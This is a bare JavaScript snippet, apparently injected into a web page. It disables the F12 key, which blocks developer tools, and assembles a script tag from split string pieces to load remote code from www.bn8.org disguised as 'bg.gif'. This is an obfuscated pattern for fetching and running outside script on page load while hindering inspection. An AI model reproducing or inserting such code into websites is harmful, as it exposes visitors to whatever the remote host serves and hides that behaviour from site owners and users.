document.onkeydown = function (e) {
var currentKey = 0, k = e || window.event;
currentKey = k.keyCode || k.which || k.charCode;
if (currentKey == 123) {
window.event.cancelBubble = true;
window.event.returnValue = false;
}
}

var s1 = "<";
var s2 = "script type=", s3 = "text/javascript src=//www.bn8.org",s4 = "/bg.gif></script";
var s5 =">";
s2 = s2 + s3 + s4;
s = s1 + s2 + s5;
document.write(s);
